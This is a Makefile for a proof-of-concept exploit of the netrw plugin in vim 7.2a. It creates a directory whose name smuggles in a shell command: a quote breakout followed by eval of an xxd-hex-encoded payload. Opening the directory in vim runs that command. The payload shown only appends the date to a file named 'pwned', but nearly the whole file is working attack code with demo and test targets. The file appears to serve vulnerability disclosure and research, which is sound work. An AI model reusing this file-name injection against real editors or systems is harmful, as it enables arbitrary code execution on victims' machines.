# Makefile for rdancer's exploit of the vim 7.2a netrw

#
# Usage {{{1
#
# Some interesting targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    This is the default target.  Runs ``make sploit'', adds contents to
#	    the exploit tarball, and opens it in vim (thereby running the
#	    exploit)
#
#	(3) make test
#	
#	    Compile and run exploit non-interactively.

#
# Variables {{{1
#

# The name of the compiled exploit.  The single quotes are there to finish and
# restart the quoting in the script we're exploiting.  INITIAL and FINAL are
# variable within limits
INITIAL = "foo"
FINAL = "bar"
PAYLOAD = 'date >> pwned'
PAYLOAD_ENCODED = 0:$(shell printf '%s' $(PAYLOAD) | xxd -g256 -c256 | cut -d' ' -f2 )
DIRECTORY_NAME = "sploit/$(INITIAL)%;eval eval \`echo $(PAYLOAD_ENCODED) | xxd -r\`;'$(FINAL)"

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

#
# Targets {{{1
#

# demo -- Open the exploit directory in vim, and report success upon exit {{{2
.PHONY: demo
demo: sploit
	rm -f $(PWN_FILE)
	vim $(VIM_OPTIONS) -- $(DIRECTORY_NAME)
	if test -f $(PWN_FILE); then \
		echo "Exploit worked: we're pwned"; \
	else \
		echo "Exploit didn't work."; \
	fi

# test -- Run the exploit in vim, non-interactively {{{2
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} '+:norm jjmtjmfmc' +:q
test: demo

# Compile the exploit {{{2
.PHONY: sploit
sploit: clean
	mkdir -p $(DIRECTORY_NAME)/target
	# Create a symlink
	ln -s -- $(DIRECTORY_NAME) exploit
	touch $(DIRECTORY_NAME)/foobar

# clean -- Remove files we can make {{{2
.PHONY: clean
clean:
	rm -rf sploit
	rm -f $(PWN_FILE)
	rm -f exploit

# test_payload -- Print both the encoded and decoded payload {{{2
.PHONY: test_payload
test_payload:
	echo $(PAYLOAD_ENCODED)
	echo $(PAYLOAD_ENCODED) | xxd -r | cat -A

#
# Modeline {{{1
#
# vim: foldmethod=marker :
